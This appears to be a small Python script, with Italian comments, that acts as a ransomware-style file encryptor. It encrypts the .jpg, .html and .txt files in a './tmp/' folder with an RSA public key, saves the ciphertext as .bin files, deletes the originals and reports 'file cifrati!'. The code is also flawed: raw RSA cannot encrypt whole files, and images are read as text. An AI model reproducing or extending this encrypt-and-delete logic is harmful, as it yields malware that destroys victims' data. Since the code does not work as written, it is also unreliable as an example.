import rsa
import os
import fnmatch

def loadKeys():
    with open('keys/publcKey.pem', 'rb') as p:
        publicKey = rsa.PublicKey.load_pkcs1(p.read())
    return publicKey


def encrypt(message, key):
    return rsa.encrypt(message.encode('ascii'), key)


publickey = loadKeys()

folder = r'./tmp/'

# iterate all files from a directory
for file_name in os.listdir(folder):

    if fnmatch.fnmatch(file_name, "*.jpg") or fnmatch.fnmatch(file_name, "*.html") or fnmatch.fnmatch(file_name,
                                                                                                      "*.txt"):
        # construct old file name
        source = folder + file_name

        #leggo il file da cifrare e lo cifro
        f = open(source, "r")
        message = f.read()
        ciphertext = encrypt(message, publickey)

        # new file name and extension
        destination = folder + file_name + ".bin"

        #scrivo il contenuto cifrato in un nuovo file binario
        f = open(destination, "wb")
        f.write(ciphertext)
        f.close()

        os.remove(source)
print('file cifrati!')

print('elenco dei file cifrati:')

# verify the result
res = os.listdir(folder)
print(res)
